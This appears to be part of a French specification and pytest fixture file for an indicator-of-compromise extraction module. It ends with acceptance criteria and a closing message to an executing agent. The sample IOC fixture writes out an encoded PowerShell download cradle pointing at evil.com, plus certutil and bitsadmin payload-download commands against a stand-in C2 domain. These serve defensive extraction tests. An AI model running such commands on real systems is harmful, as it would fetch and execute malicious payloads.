    struct.pack_into("<I", opt_header, 28, 0x400000) # ImageBase
    struct.pack_into("<I", opt_header, 32, 0x1000)  # SectionAlignment
    struct.pack_into("<I", opt_header, 36, 0x200)   # FileAlignment
    struct.pack_into("<I", opt_header, 56, 0x2000)  # SizeOfImage
    struct.pack_into("<I", opt_header, 60, 0x400)   # SizeOfHeaders

    # Section header .text (40 bytes)
    section_header = bytearray(40)
    section_header[0:8] = b".text\x00\x00\x00"
    struct.pack_into("<I", section_header, 8, 0x1000)   # VirtualSize
    struct.pack_into("<I", section_header, 12, 0x1000)  # VirtualAddress
    struct.pack_into("<I", section_header, 16, 0x200)   # SizeOfRawData
    struct.pack_into("<I", section_header, 20, 0x400)   # PointerToRawData
    struct.pack_into("<I", section_header, 36, 0x60000020)  # Characteristics

    # Section data (512 bytes de NOPs)
    section_data = b"\x90" * 512

    return (
        bytes(dos_header)
        + pe_sig
        + coff_header
        + bytes(opt_header)
        + bytes(section_header)
        + b"\x00" * (0x400 - 64 - 4 - 20 - 96 - 40)  # Padding jusqu'à l'offset 0x400
        + section_data
    )


@pytest.fixture(scope="session")
def sample_ioc_text() -> bytes:
    """Texte avec IOCs variés pour les tests d'extraction."""
    return b"""
ADMAP Test Report - IOC Extraction Test Vector
==============================================

Network Indicators:
  C2 Primary   : 185.234.100.123
  C2 Secondary : 45.77.65.211
  C2 IPv6      : 2001:db8::1
  C2 Domain    : evil-c2.ru
  Alt Domain   : payload-host.xyz
  Phishing     : login.micros0ft-verify.xyz

File Indicators:
  SHA256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
  MD5   : d41d8cd98f00b204e9800998ecf8427e
  SHA1  : da39a3ee5e6b4b0d3255bfef95601890afd80709

Host Indicators:
  Registry  : HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdaterSvc
  Mutex     : Global\\MalwareSync2024Lock
  FilePath  : C:\\Users\\Public\\AppData\\svchost32.exe
  FilePath2 : %TEMP%\\dropper_stage2.bin

Commands:
  PS Encoded : powershell.exe -EncodedCommand
               SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaHR0cHM6Ly9ldmlsLmNvbS9jMic
               AKQAkAA==
  Certutil   : certutil -decode C:\\temp\\encoded.txt C:\\temp\\payload.exe
  BitsAdmin  : bitsadmin /transfer job /download https://evil-c2.ru/mal.exe C:\\temp\\mal.exe

Defanged (should be refanged before extraction):
  hxxps[://]backup-c2[.]xyz/stage3[.]bin
  45[.]77[.]65[.]212

Email:
  attacker@evil-campaign.ru
"""


@pytest.fixture(scope="session")
def sample_ioc_bundle() -> "IOCBundle":
    """IOCBundle minimal pour les tests d'exporteurs."""
    from admap_m1.models.ioc import (
        IOC, IOCBundle, IOCType, IOCConfidenceLevel,
        FileMetadata, FileHashes, AnalysisStats,
    )
    hashes = FileHashes(
        md5="d41d8cd98f00b204e9800998ecf8427e",
        sha1="da39a3ee5e6b4b0d3255bfef95601890afd80709",
        sha256="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
    )
    metadata = FileMetadata(
        filename="test_sample.exe",
        filesize=1024,
        filetype="PE32",
        magic_bytes="4d5a90000300000004000000",
        hashes=hashes,
        entropy=5.8,
    )
    iocs = [
        IOC(
            type=IOCType.IPV4,
            value="185.234.100.123",
            value_defanged="185[.]234[.]100[.]123",
            confidence_score=75,
            confidence_level=IOCConfidenceLevel.HIGH,
            context_snippet="C2 Primary : 185.234.100.123",
            extraction_method="regex_text",
            scoring_reasons=["+20: decoded layer", "+5: routable IP"],
            first_seen=datetime.utcnow(),
        ),
        IOC(
            type=IOCType.DOMAIN,
            value="evil-c2.ru",
            value_defanged="evil-c2[.]ru",
            confidence_score=80,
            confidence_level=IOCConfidenceLevel.CONFIRMED,
            context_snippet="C2 Domain : evil-c2.ru",
            extraction_method="regex_text",
            scoring_reasons=["+5: suspect TLD (.ru)"],
            first_seen=datetime.utcnow(),
        ),
        IOC(
            type=IOCType.HASH_SHA256,
            value="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
            value_defanged="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
            confidence_score=85,
            confidence_level=IOCConfidenceLevel.CONFIRMED,
            context_snippet="SHA256: 275a021b...",
            extraction_method="regex_text",
            scoring_reasons=["+15: PE executable section"],
            first_seen=datetime.utcnow(),
        ),
        IOC(
            type=IOCType.REGISTRY_KEY,
            value="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdaterSvc",
            value_defanged="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdaterSvc",
            confidence_score=65,
            confidence_level=IOCConfidenceLevel.HIGH,
            context_snippet="Registry persistence key detected",
            extraction_method="regex_text",
            scoring_reasons=["+10: co-occurrence with imports"],
            first_seen=datetime.utcnow(),
        ),
    ]
    stats = AnalysisStats(
        total_iocs=len(iocs),
        by_type={
            "ipv4": 1, "domain": 1, "hash_sha256": 1, "registry_key": 1
        },
        filtered_out=3,
        deobfuscation_layers=1,
        duration_ms=1250,
    )
    return IOCBundle(metadata=metadata, iocs=iocs, analysis_stats=stats)


# ── Fixtures API ───────────────────────────────────────────────────────────

@pytest_asyncio.fixture
async def async_client():
    """Client HTTP asynchrone pour les tests d'intégration API."""
    from admap_m1.api.main import create_app
    app = create_app()
    async with AsyncClient(
        transport=ASGITransport(app=app),
        base_url="http://testserver",
    ) as client:
        yield client


@pytest.fixture
def test_pipeline():
    """
    Pipeline de test minimal (sans VT, sans dépendances optionnelles).
    Toujours fonctionnel même sans oletools, pyelftools, py7zr.
    """
    from admap_m1.api.main import _build_pipeline
    from admap_m1.core.config import Settings
    return _build_pipeline(Settings())


# ── Fixtures utilitaires ───────────────────────────────────────────────────

@pytest.fixture
def dummy_metadata() -> "FileMetadata":
    """FileMetadata minimal pour les tests d'extracteurs."""
    from admap_m1.models.ioc import FileMetadata, FileHashes
    return FileMetadata(
        filename="test.txt",
        filesize=100,
        filetype="text/plain",
        magic_bytes="00000000",
        hashes=FileHashes(
            md5="d41d8cd98f00b204e9800998ecf8427e",
            sha1="da39a3ee5e6b4b0d3255bfef95601890afd80709",
            sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        ),
        entropy=4.2,
    )

════════════════════════════════════════════════════════════════════════════════
SECTION 37 — INSTRUCTIONS FINALES DE LIVRAISON
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
37.1 — Commandes de vérification à exécuter après implémentation
──────────────────────────────────────────────────────────────────────────────

# Vérifier la structure (55 fichiers minimum)
find admap_m1/ tests/ -name "*.py" | wc -l

# Vérifier l'absence d'input()
grep -rn "input(" admap_m1/ && echo "VIOLATION: input() trouvé" || echo "OK: aucun input()"

# Vérifier l'absence de print() hors CLI
grep -rn "^print(" admap_m1/ | grep -v "cli/main.py" && echo "VIOLATION" || echo "OK"

# Vérifier l'absence de YARA (hors scope)
grep -rn "import yara\|yara\.compile\|yara\.match" admap_m1/ && echo "VIOLATION: YARA dans M1" || echo "OK"

# Vérifier l'absence de Scapy / PCAP (hors scope)
grep -rn "scapy\|pcap\|dpkt" admap_m1/ && echo "VIOLATION: PCAP dans M1" || echo "OK"

# Typage
mypy admap_m1/ --strict --ignore-missing-imports

# Linting
ruff check admap_m1/

# Tests unitaires (sans dépendances optionnelles)
pytest tests/unit/ -v --tb=short

# Tests avec couverture
pytest tests/ --cov=admap_m1 --cov-report=term-missing --cov-fail-under=80

# Test de démarrage du serveur (sans bloquer)
timeout 5 admap-m1 serve --port 18000 || true

# Test CLI de base
admap-m1 --version
admap-m1 analyze --help
admap-m1 export --help
admap-m1 serve --help

──────────────────────────────────────────────────────────────────────────────
37.2 — Critères d'acceptation (Definition of Done)
──────────────────────────────────────────────────────────────────────────────

Le module M1 est considéré TERMINÉ si et seulement si :

FONCTIONNEL :
  □ admap-m1 analyze tests/fixtures/sample.txt --format stix --format misp
    produit 2 fichiers valides sans erreur
  □ POST /api/v1/analyze/text avec le texte de sample_ioc_text retourne
    un IOCBundle avec total_iocs >= 5
  □ GET /api/v1/export/{id}/all retourne un ZIP contenant 4 fichiers
  □ Le pipeline complet (sans VT) s'exécute en < 5 secondes sur un fichier
    texte de 100 KB

QUALITÉ :
  □ pytest tests/ → 0 failure, 0 error
  □ Couverture tests ≥ 80% (--cov-fail-under=80)
  □ mypy --strict → 0 erreur
  □ ruff → 0 violation

SÉCURITÉ :
  □ grep -r "input(" admap_m1/ → 0 résultat
  □ grep -r "subprocess.run\|os.system\|os.popen" admap_m1/ → 0 résultat
  □ grep -r "eval(\|exec(" admap_m1/ → 0 résultat

PÉRIMÈTRE :
  □ grep -r "import yara\|yara\.compile" admap_m1/ → 0 résultat
  □ grep -r "scapy\|dpkt\|pcap" admap_m1/ → 0 résultat
  □ grep -r "sklearn\|torch\|tensorflow\|spacy\|transformers" admap_m1/ → 0 résultat

CONTRAT D'INTERFACE :
  □ IOCBundle.model_dump_json() produit un JSON désérialisable par
    IOCBundle.model_validate_json()
  □ Tous les champs de IOCBundle sont sérialisables (pas de types non-JSON)
  □ pipeline_version == "3.0.0" dans chaque bundle produit

──────────────────────────────────────────────────────────────────────────────
37.3 — Note sur les données de référence critiques
──────────────────────────────────────────────────────────────────────────────

Les données suivantes dans whitelist.py et regex_extractor.py sont
le résultat d'un affinage empirique sur des cas réels. Elles ne doivent
PAS être modifiées, réduites ou "optimisées" sans tests préalables :

  VALID_TLDS       : Réduire → faux négatifs (domaines legit non reconnus)
  BENIGN_DOMAINS   : Réduire → faux positifs (domaines MS, Google, etc.)
  SYSTEM_MODULE_PATTERNS : Réduire → faux positifs (noms de modules Python)
  Patterns regex   : Modifier → risque de faux positifs/négatifs

Ces données doivent être portées INTÉGRALEMENT depuis le code source existant
(extracteur.py). En cas de doute sur une entrée : la conserver.

──────────────────────────────────────────────────────────────────────────────
37.4 — Message final à l'agent d'exécution
──────────────────────────────────────────────────────────────────────────────

Tu disposes maintenant de la spécification complète et exhaustive du
Module M1 de la plateforme ADMAP. Cette spécification couvre :

  • 37 sections de spécifications détaillées
  • 55 fichiers à créer dans l'ordre exact
  • Les données de référence complètes à porter
  • Les patterns regex calibrés
  • Les règles de scoring documentées avec exemples
  • Les cas limites et comportements défensifs
  • Les fixtures pytest complètes
  • Les critères d'acceptation vérifiables

COMMENCE PAR : pyproject.toml et core/exceptions.py
TERMINE PAR  : tests/integration/test_pipeline.py et README.md

À chaque fichier créé, relire mentalement la checklist Section 37.2
pour vérifier la conformité avant de passer au suivant.

Le module M1 est autonome, programmatique, et prêt à s'intégrer dans la
plateforme ADMAP via son API REST et son contrat IOCBundle.